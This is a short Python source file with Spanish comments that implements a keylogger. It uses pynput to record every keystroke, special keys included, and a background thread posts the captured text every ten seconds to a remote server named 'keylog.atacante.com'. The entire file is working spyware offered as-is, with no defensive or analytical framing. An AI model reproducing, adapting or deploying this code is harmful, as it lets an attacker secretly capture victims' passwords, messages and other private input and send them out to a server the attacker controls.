from pynput import keyboard
import requests
import threading

# URL del servidor remoto al que se enviarán las pulsaciones de teclas
url_servidor = 'https://keylog.atacante.com'

# Variable global para almacenar las pulsaciones
pulsaciones = []

def enviar_datos():
    """
    Función que envía las pulsaciones de teclas al servidor remoto.
    Se ejecuta periódicamente en un hilo separado.
    """
    while True:
        if pulsaciones:
            try:
                # Convierte la lista de pulsaciones a una cadena
                datos = ''.join(pulsaciones)
                
                # Enviar las pulsaciones al servidor
                requests.post(url_servidor, data={'keystrokes': datos})
                
                # Limpia la lista después de enviarlas
                pulsaciones.clear()

            except Exception as e:
                print(f"Error al enviar las pulsaciones: {e}")

        # Espera 10 segundos antes de intentar enviar de nuevo
        threading.Event().wait(10)

def on_press(key):
    """
    Función que captura la pulsación de teclas.
    """
    try:
        # Captura teclas regulares
        pulsaciones.append(key.char)
    except AttributeError:
        # Captura teclas especiales (como Enter, Shift, etc.)
        pulsaciones.append(f'[{key}]')

def iniciar_keylogger():
    """
    Inicia el keylogger capturando las pulsaciones de teclas.
    """
    # Inicia el hilo que enviará las pulsaciones periódicamente
    envio_hilo = threading.Thread(target=enviar_datos, daemon=True)
    envio_hilo.start()

    # Inicia el listener de teclado
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    iniciar_keylogger()
